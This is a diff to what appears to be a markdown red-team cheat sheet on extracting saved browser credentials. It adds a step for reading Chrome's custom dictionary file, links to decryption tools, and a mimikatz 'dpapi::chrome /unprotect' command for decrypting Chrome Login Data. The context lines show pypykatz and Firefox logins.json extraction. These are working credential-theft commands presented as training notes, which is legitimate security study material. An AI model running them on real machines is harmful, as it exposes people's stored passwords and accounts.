@@ -23,6 +23,16 @@ Additional notes:
 $ ls -l .mozilla/firefox/ | grep default
 $ cat .mozilla/firefox/xxx.default-release/logins.json | jq.
 ```
+
+#### Extract Chrome Dictionaries
+
+[![windows_privilege_escalation](../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+Users may have added some sensitive information inside their personal browser dictionary <small>(email/username/...)</small>.
+
+```ps
+PS> ls "$Env:localappdata/Google/Chrome/User Data/Default/Custom Dictionary.txt"
+```
 </div><div>
 
 #### Extract Chrome, Edge, and Brave Saved Passwords
@@ -36,6 +46,18 @@ AppData\Local\Microsoft\Edge\User Data
 AppData\Local\Google\Chrome\User Data
 AppData\Local\BraveSoftware\Brave-Browser\User Data\
 ```
+
+* **Decrypt on Windows** using [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/) <small>(0.8k ⭐)</small>
+
+* **Decrypt on Windows** [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
+
+For the current user, you can use:
+
+```shell!
+mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+* **Decrypt on Linux** using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)
 
 Passwords are stored [SQLite](/programming-languages/databases/relational/dbms/sqlite.md) database in `./<profile>/Login Data` such as `./Default/Login Data`. They are encrypted using a base64-encoded key in `./Local State`. You can display it using:
 
@@ -56,8 +78,6 @@ $ cat mkf # master kejson file created by pypykatz
 }
 $ pypykatz dpapi chrome ./mkf "./Local State" --logindata "./Default/Login Data"
 ```
-
-➡️ We can use [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/) <small>(0.8k ⭐)</small> on Windows that actually automates the whole process.
 </div></div>
 
 <hr class="sep-both">
